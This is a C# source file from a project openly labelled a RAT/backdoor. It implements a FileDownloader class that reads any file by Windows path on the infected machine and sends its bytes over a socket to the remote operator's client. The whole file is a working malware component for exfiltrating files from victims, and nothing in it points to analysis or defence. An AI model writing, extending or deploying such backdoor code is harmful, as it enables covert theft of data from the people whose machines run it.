using RAT.src.Interfaces;

namespace RAT.src.Logic.RatCommands.Features
{
    /// <summary>
    /// File downloading feature for rat/backdoor.
    /// </summary>
    public class FileDownloader : IFileDownloader
    {
        private readonly ISocketConnectionSendingLogic _sendingLogic;
        private readonly ISocketConnectionConnectLogic _connectionLogic;
        private readonly ISocketConnectionDisconnectLogic _disconnectLogic;
        private readonly IFileLogic _fileLogic;

        /// <summary>
        /// File downloading feature for rat/backdoor.
        /// </summary>
        /// <param name="sendingLogic">Logic for data sending to client.</param>
        /// <param name="connectLogic">Logic for making/creating connection for sockets.</param>
        /// <param name="disconnectLogic">Logic socket disconnection.</param>
        public FileDownloader(
            ISocketConnectionSendingLogic sendingLogic,
            ISocketConnectionConnectLogic connectLogic,
            ISocketConnectionDisconnectLogic disconnectLogic,
            IFileLogic fileLogic)
        {
            _sendingLogic = sendingLogic;
            _connectionLogic = connectLogic;
            _disconnectLogic = disconnectLogic;
            _fileLogic = fileLogic;
        }

        /// <summary>
        /// Downloads file (sends to client) by provided windows path over socket connection.
        /// </summary>
        /// <param name="path">Windows path of the file that should be downloaded.</param>
        public void DownloadFile(string path)
        {
            var fileBytes = _fileLogic.GetFileBytesByPath(path);
            if (fileBytes.Length == 0)
            {
                return;
            }

            this.SendFile(fileBytes);
        }

        /// <summary>
        /// Sends file to client.
        /// </summary>
        /// <param name="fileBytes">File data in byte array.</param>
        private void SendFile(byte[] fileBytes)
        {
            var socketForFileDownload = _connectionLogic.GetConnectedSocketForFileDownload();
            if (!socketForFileDownload.Connected)
            {
                return;
            }

            _sendingLogic.SendDataToClient(socketForFileDownload, fileBytes, _sendingLogic.OnFileSend);
            _disconnectLogic.DisconnectSocket(socketForFileDownload);
        }
    }
}